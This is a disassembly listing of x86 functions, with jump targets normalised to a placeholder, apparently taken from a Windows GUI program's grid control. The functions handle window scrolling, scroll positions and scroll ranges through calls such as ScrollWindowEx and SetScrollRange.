mov eax [ eax - 0x8 ]
mov edx [ eax ]
call [ edx + 0x88 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
call sub_474f10
mov eax [ ebp + 0x8 ]
push eax
call sub_474324
pop ecx
mov ebx eax
sub ebx [ ebp - 0x4 ]
jmp r-xdata
mov ebx [ ebp - 0x4 ]
jmp r-xdata
sub_4746d8
push ebp
mov ebp esp
add esp 0xffffff78
push ebx
push esi
push edi
mov [ ebp - 0x74 ] ecx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x8 ] eax
lea edi [ ebp - 0x80 ]
mov eax [ ebp - 0x8 ]
mov si 0xffc8
call sub_40349c
test al al
je r-xdata
mov [ ebp - 0x78 ] 0x1
jmp r-xdata
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x57 ] 0x0
je r-xdata
mov [ ebp - 0x78 ] 0xffffffff
lea edx [ ebp - 0x70 ]
mov eax [ ebp - 0x8 ]
call sub_473310
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
mov eax [ ebp - 0x8 ]
mov si 0xffb8
call sub_40349c
test al al
je r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x21c ]
dec eax
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x24c ]
dec eax
mov [ ebp - 0xc ] eax
lea eax [ ebp - 0x88 ]
push eax
lea ecx [ ebp - 0x70 ]
lea edx [ ebp - 0x10 ]
mov eax [ ebp - 0x8 ]
call sub_473548
mov eax [ ebp - 0x88 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x84 ]
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x8 ]
mov edx [ eax + 0x258 ]
mov [ edi ] edx
mov edx [ eax + 0x25c ]
mov [ edi + 0x4 ] edx
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x21c ] 0x1
jne r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x1a4 ] 0x0
je r-xdata
mov esi [ edi + 0x4 ]
mov ebx esi
push ebp
mov edx 0x1
mov eax esi
call sub_4743f4
pop ecx
mov [ edi + 0x4 ] eax
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x23c ]
mov esi [ edi + 0x4 ]
cmp eax esi
jge r-xdata
mov esi [ edi ]
mov ebx esi
push ebp
mov edx [ ebp - 0x78 ]
mov eax esi
call sub_4743f4
pop ecx
mov [ edi ] eax
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x238 ]
mov esi [ edi ]
cmp eax esi
jge r-xdata
push ebp
mov edx [ ebp + 0xc ]
mov eax [ ebp - 0x74 ]
call sub_47452c
pop ecx
jmp r-xdata
mov eax [ ebp - 0x8 ]
test [ eax + 0x1c ] 0x10
jne r-xdata
mov edx [ edi ]
mov eax [ ebp - 0x10 ]
call sub_4243f4
mov edx eax
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x238 ]
call sub_4243fc
mov [ edi ] eax
mov edx [ edi + 0x4 ]
mov eax [ ebp - 0xc ]
call sub_4243f4
mov edx eax
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x23c ]
call sub_4243fc
mov [ edi + 0x4 ] eax
mov edx [ ebp - 0x8 ]
mov edx [ edx + 0x258 ]
mov eax [ edi ]
cmp edx eax
jne r-xdata
cmp esi [ ebp - 0xc ]
jge r-xdata
cmp esi [ ebp - 0x10 ]
jge r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx + 0xc4 ]
mov ecx [ edi + 0x4 ]
mov edx eax
mov eax [ ebp - 0x8 ]
call sub_474ad4
mov edx [ ebp - 0x8 ]
mov edx [ edx + 0x25c ]
cmp edx [ edi + 0x4 ]
je r-xdata
mov edx esi
mov eax [ ebp - 0x8 ]
call sub_4763a4
test eax eax
jg r-xdata
mov edx esi
mov eax [ ebp - 0x8 ]
call sub_476384
test eax eax
jg r-xdata
cmp esi ebx
jne r-xdata
cmp esi ebx
jne r-xdata
jmp r-xdata
sub_4748c0
push ebp
mov ebp esp
push esi
push edi
mov eax [ ebp + 0x8 ]
cmp ecx [ edx ]
jne r-xdata
mov esi ecx
mov edi eax
cmp eax ecx
jge r-xdata
mov [ edx ] eax
jmp r-xdata
cmp esi [ edx ]
jg r-xdata
mov esi eax
mov edi ecx
pop edi
pop esi
pop ebp
retn 0x4
cmp edi [ edx ]
jl r-xdata
cmp eax ecx
jge r-xdata
dec [ edx ]
inc [ edx ]
jmp r-xdata
sub_4748f4
push ebx
push esi
add esp 0xfffffff0
mov esi edx
mov ebx eax
mov ax [ ebx + 0x248 ]
and ax [ r-xdata ]
mov dx [ r-xdata ]
cmp dx ax
jne r-xdata
push 0x1
push 0x1
mov ecx [ esi + 0x4 ]
mov edx [ esi ]
mov eax ebx
call sub_47497c
mov edx esp
mov eax ebx
call sub_4763c4
mov eax [ esi ]
mov [ ebx + 0x210 ] eax
mov eax [ esi + 0x4 ]
mov [ ebx + 0x214 ] eax
test [ ebx + 0x249 ] 0x10
je r-xdata
mov edx esi
mov eax ebx
call sub_473c3c
mov edx esp
mov eax ebx
call sub_474b40
jmp r-xdata
mov eax [ ebx + 0x21c ]
dec eax
mov [ ebx + 0x210 ] eax
add esp 0x10
pop esi
pop ebx
retn
sub_47497c
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x20 ] ebx
mov [ ebp - 0x4 ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_474ac1
push [ fs : eax ]
mov [ fs : eax ] esp
test esi esi
jl r-xdata
lea edx [ ebp - 0x20 ]
mov eax [ rw-data ]
call sub_405ba4
mov eax [ ebp - 0x20 ]
call sub_470e64
cmp [ ebp - 0x4 ] 0x0
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_474ac8
lea eax [ ebp - 0x20 ]
call sub_404074
retn
lea edx [ ebp - 0x1c ]
mov eax ebx
call sub_4763c4
mov eax [ ebx + 0x228 ]
mov [ ebp - 0xc ] eax
mov eax [ ebx + 0x22c ]
mov [ ebp - 0x8 ] eax
mov [ ebx + 0x228 ] esi
mov eax [ ebp - 0x4 ]
mov [ ebx + 0x22c ] eax
test [ ebx + 0x249 ] 0x20
jne r-xdata
cmp esi [ ebx + 0x21c ]
jge r-xdata
cmp [ ebp + 0xc ] 0x0
jne r-xdata
mov eax ebx
call sub_472230
mov eax [ ebp - 0x4 ]
cmp eax [ ebx + 0x24c ]
jl r-xdata
mov eax [ ebx + 0x228 ]
mov [ ebx + 0x210 ] eax
mov eax [ ebx + 0x22c ]
mov [ ebx + 0x214 ] eax
test [ ebx + 0x249 ] 0x10
je r-xdata
test [ ebx + 0x248 ] 0x10
jne r-xdata
mov ecx [ ebp - 0x4 ]
mov edx esi
mov eax ebx
mov edi [ eax ]
call [ edi + 0xdc ]
test al al
je r-xdata
test [ ebx + 0x249 ] 0x10
je r-xdata
mov eax [ ebx + 0x21c ]
dec eax
mov [ ebx + 0x210 ] eax
cmp [ ebp + 0x8 ] 0x0
je r-xdata
mov eax [ ebx + 0x238 ]
mov [ ebx + 0x228 ] eax
lea edx [ ebp - 0x1c ]
mov eax ebx
call sub_474b40
mov ecx [ ebp - 0x8 ]
mov edx [ ebp - 0xc ]
mov eax ebx
call sub_474288
mov ecx [ ebp - 0x4 ]
mov edx esi
mov eax ebx
call sub_474288
lea edx [ ebx + 0x228 ]
mov eax ebx
call sub_473c3c
sub_474ad4
push ebx
push esi
push edi
add esp 0xfffffff8
mov edi ecx
mov esi edx
mov ebx eax
cmp esi [ ebx + 0x258 ]
jne r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x88 ]
mov eax [ ebx + 0x258 ]
mov [ esp ] eax
mov eax [ ebx + 0x25c ]
mov [ esp + 0x4 ] eax
mov [ ebx + 0x258 ] esi
mov [ ebx + 0x25c ] edi
mov edx esp
mov eax ebx
call sub_474e10
cmp edi [ ebx + 0x25c ]
je r-xdata
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
sub_474b40
push ebx
push esi
push edi
add esp 0xffffff90
mov ebx edx
mov edi eax
mov eax edi
call sub_4448fc
test al al
je r-xdata
add esp 0x70
pop edi
pop esi
pop ebx
retn
push 0x1
lea ecx [ esp + 0x4 ]
mov edx ebx
mov eax edi
call sub_474138
push 0x1
lea edx [ esp + 0x64 ]
mov eax edi
call sub_4763c4
lea edx [ esp + 0x64 ]
lea ecx [ esp + 0x14 ]
mov eax edi
call sub_474138
lea ecx [ esp + 0x20 ]
lea edx [ esp + 0x10 ]
mov eax esp
call sub_470fe0
mov esi 0x4
lea ebx [ esp + 0x20 ]
push 0x0
push ebx
mov eax edi
call sub_4445f8
push eax
call InvalidateRect
add ebx 0x10
dec esi
jne r-xdata
sub_474bb8
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
push esi
push edi
mov esi ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov edi [ ebp + 0x8 ]
mov [ ebp - 0x8 ] 0x2
cmp [ ebx + 0x28c ] 0x0
jne r-xdata
test esi esi
jne r-xdata
or [ ebp - 0x8 ] 0x4
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
mov eax ebx
mov si 0xffc8
call sub_40349c
test al al
jne r-xdata
mov eax [ edi + 0x34 ]
push eax
lea eax [ ebp - 0x18 ]
push eax
mov ecx [ edi + 0xc ]
mov eax [ edi + 0x4 ]
xor edx edx
call sub_4129b0
mov eax [ ebp - 0x8 ]
push eax
push 0x0
push 0x0
lea eax [ ebp - 0x18 ]
push eax
lea eax [ ebp - 0x18 ]
push eax
push 0x0
mov eax [ ebp - 0x4 ]
push eax
mov eax ebx
call sub_4445f8
push eax
call ScrollWindowEx
mov eax [ edi + 0x3c ]
push eax
lea eax [ ebp - 0x18 ]
push eax
mov ecx [ edi + 0x4 ]
mov edx [ edi + 0x34 ]
xor eax eax
call sub_4129b0
mov eax [ ebp - 0x8 ]
push eax
push 0x0
push 0x0
lea eax [ ebp - 0x18 ]
push eax
lea eax [ ebp - 0x18 ]
push eax
push esi
push 0x0
mov eax ebx
call sub_4445f8
push eax
call ScrollWindowEx
mov eax [ edi + 0x3c ]
push eax
lea eax [ ebp - 0x18 ]
push eax
mov ecx [ edi + 0xc ]
mov edx [ edi + 0x34 ]
mov eax [ edi + 0x4 ]
call sub_4129b0
mov eax [ ebp - 0x8 ]
push eax
push 0x0
push 0x0
lea eax [ ebp - 0x18 ]
push eax
lea eax [ ebp - 0x18 ]
push eax
push esi
mov eax [ ebp - 0x4 ]
push eax
mov eax ebx
call sub_4445f8
push eax
call ScrollWindowEx
mov eax [ edi + 0x3c ]
push eax
lea eax [ ebp - 0x18 ]
push eax
mov ecx [ edi + 0xc ]
mov edx [ edi + 0x34 ]
xor eax eax
call sub_4129b0
mov eax [ ebp - 0x8 ]
push eax
push 0x0
push 0x0
lea eax [ ebp - 0x18 ]
push eax
lea eax [ ebp - 0x18 ]
push eax
push esi
push 0x0
mov eax ebx
call sub_4445f8
push eax
call ScrollWindowEx
jmp r-xdata
mov eax [ edi + 0x3c ]
push eax
lea eax [ ebp - 0x18 ]
push eax
mov eax ebx
call sub_43d7fc
sub eax [ edi + 0x4 ]
push eax
mov eax ebx
call sub_43d7fc
sub eax [ edi + 0xc ]
xor edx edx
pop ecx
call sub_4129b0
neg [ ebp - 0x4 ]
mov eax [ edi + 0x3c ]
push eax
lea eax [ ebp - 0x18 ]
push eax
mov ecx [ edi + 0xc ]
mov eax [ edi + 0x4 ]
xor edx edx
call sub_4129b0
jmp r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
lea edx [ ebp - 0x28 ]
mov eax ebx
call sub_4763c4
lea edx [ ebp - 0x28 ]
mov eax ebx
call sub_4742b4
test [ ebx + 0x249 ] 0x10
je r-xdata
mov eax [ ebp - 0x8 ]
push eax
push 0x0
push 0x0
lea eax [ ebp - 0x18 ]
push eax
lea eax [ ebp - 0x18 ]
push eax
push 0x0
mov eax [ ebp - 0x4 ]
push eax
mov eax ebx
call sub_4445f8
push eax
call ScrollWindowEx
jmp r-xdata
sub_474d64
push ebx
push esi
push edi
add esp 0xffffffa0
mov edi ecx
mov esi edx
mov ebx eax
mov edx esp
mov eax ebx
call sub_473310
push esp
mov ecx edi
mov edx esi
mov eax ebx
call sub_474bb8
add esp 0x60
pop edi
pop esi
pop ebx
retn
sub_474d8c
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov esi [ ebp + 0x8 ]
mov [ ebp - 0x9 ] 0x0
mov eax [ ebp - 0x4 ]
cmp eax [ ebp - 0x8 ]
jge r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x8 ]
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp eax [ ebp - 0x8 ]
jge r-xdata
inc edx
mov [ ebp - 0x14 ] edx
mov [ ebp - 0x10 ] eax
xor ecx ecx
mov [ esi ] ecx
dec edx
sub edx eax
jl r-xdata
mov [ ebp - 0x9 ] 0x1
neg [ esi ]
inc [ ebp - 0x10 ]
dec [ ebp - 0x14 ]
jne r-xdata
mov eax [ ebp + 0xc ]
mov eax [ eax - 0x4 ]
call sub_4742ac
jmp r-xdata
mov edx [ ebp - 0x10 ]
mov eax [ ebx + 0x2c ]
call [ ebx + 0x28 ]
add eax [ ebx ]
add [ esi ] eax
mov eax [ ebx + 0x8 ]
sub eax [ ebx + 0x4 ]
cmp eax [ esi ]
jge r-xdata
mov al [ ebp - 0x9 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_474e10
push ebp
mov ebp esp
add esp 0xffffff90
push ebx
push esi
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_474f10
lea edx [ ebp - 0x70 ]
mov eax [ ebp - 0x4 ]
call sub_473310
push ebp
lea eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x258 ]
mov edx [ ebx ]
lea eax [ ebp - 0x70 ]
call sub_474d8c
pop ecx
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
mov si 0xffa7
call sub_40349c
pop esi
pop ebx
mov esp ebp
pop ebp
retn
push ebp
lea eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x25c ]
mov edx [ ebx + 0x4 ]
lea eax [ ebp - 0x40 ]
call sub_474d8c
pop ecx
test al al
je r-xdata
lea eax [ ebp - 0x70 ]
push eax
mov ecx [ ebp - 0x8 ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_474bb8
sub_474e90
push ebp
mov ebp esp
push ebx
push esi
push edi
mov ebx edx
mov edi eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov si 0xffc8
call sub_40349c
test al al
je r-xdata
movzx esi di
push esi
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_4445f8
push eax
call GetScrollPos
cmp ebx eax
je r-xdata
test di di
jne r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
push 0xffffffff
push ebx
push esi
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_4445f8
push eax
call SetScrollPos
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp [ eax + 0x21c ] 0x1
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ ebp + 0x8 ]
sub eax [ edx - 0xc ]
sub eax ebx
mov ebx eax
mov eax 0x7f
sub eax ebx
mov ebx eax
jmp r-xdata
sub_474f10
push ebp
mov ebp esp
add esp 0xffffff80
push ebx
push esi
mov [ ebp - 0x4 ] eax
lea esi [ ebp - 0x4 ]
mov eax [ esi ]
call sub_4448fc
test al al
je r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ esi ]
cmp [ eax + 0x254 ] 0x0
je r-xdata
lea edx [ ebp - 0x78 ]
mov eax [ esi ]
call sub_473310
mov eax [ esi ]
mov eax [ eax + 0x21c ]
dec eax
mov [ ebp - 0x14 ] eax
mov eax [ esi ]
mov eax [ eax + 0x24c ]
dec eax
mov [ ebp - 0x10 ] eax
lea eax [ ebp - 0x80 ]
push eax
lea ecx [ ebp - 0x78 ]
lea edx [ ebp - 0x14 ]
mov eax [ esi ]
call sub_473548
mov eax [ ebp - 0x80 ]
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x7c ]
mov [ ebp - 0x10 ] eax
mov eax [ esi ]
mov al [ eax + 0x254 ]
sub al 0x1
je r-xdata
mov eax [ esi ]
cmp [ eax + 0x21c ] 0x1
jne r-xdata
sub al 0x2
jne r-xdata
push ebp
mov eax [ esi ]
mov ebx [ eax + 0x238 ]
mov eax [ ebp - 0x14 ]
sub eax ebx
push eax
push 0x7f
mov eax [ esi ]
mov eax [ eax + 0x258 ]
sub eax ebx
push eax
call MulDiv
mov edx eax
xor eax eax
call sub_474e90
pop ecx
mov edx [ ebp - 0x5c ]
mov eax [ esi ]
call sub_476384
mov [ ebp - 0x8 ] eax
mov eax [ esi ]
call sub_43d7fc
sub eax [ ebp - 0x74 ]
mov [ ebp - 0xc ] eax
mov eax [ esi ]
mov eax [ eax + 0x288 ]
test eax eax
jle r-xdata
mov eax [ esi ]
mov al [ eax + 0x254 ]
add al 0xfe
sub al 0x2
jae r-xdata
push ebp
mov eax [ esi ]
mov ebx [ eax + 0x23c ]
mov eax [ ebp - 0x10 ]
sub eax ebx
push eax
push 0x7f
mov eax [ esi ]
mov eax [ eax + 0x25c ]
sub eax ebx
push eax
call MulDiv
mov edx eax
mov ax 0x1
call sub_474e90
pop ecx
push ebp
mov edx eax
xor eax eax
call sub_474e90
pop ecx
jmp r-xdata
mov edx [ ebp - 0x8 ]
sub edx eax
cmp edx [ ebp - 0xc ]
jge r-xdata
mov eax [ ebp - 0x8 ]
sub eax [ ebp - 0xc ]
push eax
push 0x1
mov ecx 0x4
xor edx edx
mov eax [ esi ]
call sub_4746d8
jmp r-xdata
sub_47505c
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x1 ] 0x0
jne r-xdata
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ eax ]
call [ edx + 0x88 ]
mov eax [ ebp + 0x8 ]
mov [ eax - 0x1 ] 0x1
sub_475080
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov ebx eax
xor eax eax
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
cmp [ edx + 0x254 ] 0x3
je r-xdata
lea eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x4 ]
push eax
movzx eax bx
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
call sub_4445f8
push eax
call GetScrollRange
mov eax [ ebp - 0x4 ]
cmp eax [ ebp - 0x8 ]
setne al
test bx bx
jne r-xdata
cmp bx 0x1
jne r-xdata
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
cmp [ edx + 0x254 ] 0x1
je r-xdata
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
cmp [ edx + 0x254 ] 0x2
jne r-xdata
sub_4750f0
push ebp
mov ebp esp
add esp 0xfffffff8
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x2c ]
push eax
mov eax [ ebp + 0x8 ]
mov ecx [ eax - 0x5c ]
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x68 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
call sub_473394
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x21c ]
dec eax
mov edx [ ebp + 0x8 ]
mov [ edx - 0x70 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x24c ]
dec eax
mov edx [ ebp + 0x8 ]
mov [ edx - 0x6c ] eax
lea eax [ ebp - 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
lea ecx [ eax - 0x68 ]
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x70 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
call sub_473548
mov eax [ ebp + 0x8 ]
mov edx [ ebp - 0x8 ]
mov [ eax - 0x70 ] edx
mov edx [ ebp - 0x4 ]
mov [ eax - 0x6c ] edx
pop ecx
pop ecx
pop ebp
retn
sub_475168
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx eax
mov esi [ ebp + 0xc ]
mov eax [ ebp + 0x10 ]
push eax
call sub_4750f0
pop ecx
mov eax [ ebx ]
cmp eax [ ebp + 0x8 ]
jle r-xdata
push 0xffffffff
push 0x0
push 0x0
movzx eax si
push eax
mov eax [ ebp + 0x10 ]
mov eax [ eax - 0x8 ]
call sub_4445f8
push eax
call SetScrollRange
push 0xffffffff
push 0x7f
push 0x0
movzx eax si
push eax
mov eax [ ebp + 0x10 ]
mov eax [ eax - 0x8 ]
call sub_4445f8
push eax
call SetScrollRange
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x8
mov eax [ ebp + 0x10 ]
push eax
call sub_47505c
pop ecx
mov eax [ ebx ]
mov edx [ ebp - 0x4 ]
mov [ edx ] eax
mov eax [ edi ]
cmp eax [ ebx ]
jle r-xdata
sub_4751e4
push ebp
mov ebp esp
push ebx
mov eax [ ebp + 0x8 ]
mov al [ eax - 0x79 ]
sub al 0x1
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
cmp [ eax + 0x21c ] 0x1
jne r-xdata
sub al 0x2
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
push 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x238 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
lea ecx [ eax + 0x258 ]
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x78 ]
mov eax [ ebp + 0x8 ]
add eax 0xffffff90
call sub_475168
pop ecx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
xor edx edx
call sub_476384
mov ebx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
call sub_43d7fc
sub ebx eax
test ebx ebx
jge r-xdata
pop ebx
pop ebp
retn
push 0xffffffff
push ebx
push 0x0
push 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
call sub_4445f8
push eax
call SetScrollRange
jmp r-xdata
xor ebx ebx
sub_475278
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov al [ eax - 0x79 ]
add al 0xfe
sub al 0x2
jae r-xdata
pop ebp
retn
mov eax [ ebp + 0x8 ]
push eax
push 0x1
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x23c ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
lea ecx [ eax + 0x25c ]
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x74 ]
mov eax [ ebp + 0x8 ]
add eax 0xffffff94
call sub_475168
pop ecx
sub_4752bc
push ebp
mov ebp esp
add esp 0xffffff84
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x254 ] 0x0
je r-xdata
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x8 ]
call sub_4448fc
test al al
je r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x1a6 ] 0x0
je r-xdata
mov eax [ ebp - 0x8 ]
call sub_43d7fc
mov [ ebp - 0x5c ] eax
mov eax [ ebp - 0x8 ]
call sub_43d840
mov [ ebp - 0x2c ] eax
push ebp
xor eax eax
call sub_475080
pop ecx
test al al
je r-xdata
push ebp
mov ax 0x1
call sub_475080
pop ecx
test al al
je r-xdata
push 0x3
call GetSystemMetrics
add [ ebp - 0x2c ] eax
mov eax [ ebp - 0x8 ]
mov edx [ eax + 0x258 ]
mov [ ebp - 0x78 ] edx
mov edx [ eax + 0x25c ]
mov [ ebp - 0x74 ] edx
mov eax [ ebp - 0x8 ]
mov al [ eax + 0x254 ]
mov [ ebp - 0x79 ] al
mov eax [ ebp - 0x8 ]
mov [ eax + 0x254 ] 0x0
mov [ ebp - 0x1 ] 0x0
xor eax eax
push ebp
push sub_4753ca
push [ fs : eax ]
mov [ fs : eax ] esp
push ebp
call sub_4751e4
pop ecx
mov eax [ ebp - 0x8 ]
call sub_43d840
mov [ ebp - 0x2c ] eax
push ebp
call sub_475278
pop ecx
mov eax [ ebp - 0x8 ]
call sub_43d7fc
cmp eax [ ebp - 0x5c ]
je r-xdata
push 0x2
call GetSystemMetrics
add [ ebp - 0x5c ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4753d1
mov eax [ ebp - 0x8 ]
mov dl [ ebp - 0x79 ]
mov [ eax + 0x254 ] dl
retn
mov eax [ ebp - 0x8 ]
call sub_43d7fc
mov [ ebp - 0x5c ] eax
push ebp
call sub_4751e4
pop ecx
sub_4753d1
mov eax [ ebp - 0x8 ]
call sub_474f10
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x258 ]
cmp eax [ ebp - 0x78 ]
jne r-xdata
lea edx [ ebp - 0x78 ]
mov eax [ ebp - 0x8 ]
call sub_474e10
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x25c ]
cmp eax [ ebp - 0x74 ]
je r-xdata
mov esp ebp
pop ebp
retn
sub_475414
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_441484
or [ esi + 0x4 ] 0x10000
mov al [ ebx + 0x254 ]
add al 0xfe
sub al 0x2
jae r-xdata
mov al [ ebx + 0x254 ]
sub al 0x1
je r-xdata
or [ esi + 0x4 ] 0x200000
or [ esi + 0x4 ] 0x100000
sub al 0x2
jne r-xdata
pop esi
pop ebx
retn
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
mov [ esi + 0x24 ] 0x8
cmp [ ebx + 0x218 ] 0x1
jne r-xdata
or [ esi + 0x4 ] 0x800000
cmp [ ebx + 0x1a5 ] 0x0
je r-xdata
and [ esi + 0x4 ] 0xff7fffff
or [ esi + 0x8 ] 0x200
jmp r-xdata
sub_475490
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x60 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x64 ]
call sub_473310
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x50 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x64 ]
sub eax [ edx + 0x258 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x68 ] eax
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x68 ] 0x1
jge r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x20 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x64 ]
sub eax [ edx + 0x25c ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x6c ] eax
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x6c ] 0x1
jge r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax - 0x68 ] 0x1
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov [ eax - 0x6c ] 0x1
sub_4754fc
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov esi [ ebp + 0x8 ]
mov ebx [ ebp + 0xc ]
mov edi [ eax ]
cmp ebx edi
jge r-xdata
cmp edx edi
jle r-xdata
mov [ eax ] ebx
jmp r-xdata
mov edx [ eax + 0x4 ]
cmp esi edx
jge r-xdata
mov [ eax ] edx
cmp edx [ ebp - 0x4 ]
jge r-xdata
mov [ eax + 0x4 ] esi
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x8
mov edx [ ebp - 0x4 ]
mov [ eax + 0x4 ] edx
sub_47553c
push ebp
mov ebp esp
add esp 0xffffff6c
push ebx
push esi
push edi
mov [ ebp - 0x6d ] cl
mov ebx edx
mov [ ebp - 0x64 ] eax
lea edi [ ebp - 0x64 ]
mov edx ebx
mov cl [ ebp - 0x6d ]
mov eax [ edi ]
call sub_443424
mov [ ebp - 0x89 ] 0x0
mov dx [ ebx ]
mov cl [ ebp - 0x6d ]
mov eax [ edi ]
mov si 0xffb1
call sub_40349c
test al al
jne r-xdata
mov eax [ edi ]
mov si 0xffc8
call sub_40349c
test al al
jne r-xdata
mov [ ebx ] 0x0
or esi 0xffffffff
mov esi 0x1
jmp r-xdata
movzx eax [ ebx ]
cmp eax 0x25
jg r-xdata
movzx eax [ ebx ]
add eax 0xffffffdf
cmp eax 0x7
ja r-xdata
mov eax [ edi ]
mov edx [ eax + 0x228 ]
mov [ ebp - 0x80 ] edx
mov edx [ eax + 0x22c ]
mov [ ebp - 0x7c ] edx
mov eax [ edi ]
mov edx [ eax + 0x258 ]
mov [ ebp - 0x78 ] edx
mov edx [ eax + 0x25c ]
mov [ ebp - 0x74 ] edx
push ebp
call sub_475490
pop ecx
test [ ebp - 0x6d ] 0x4
je r-xdata
sub eax 0x26
je r-xdata
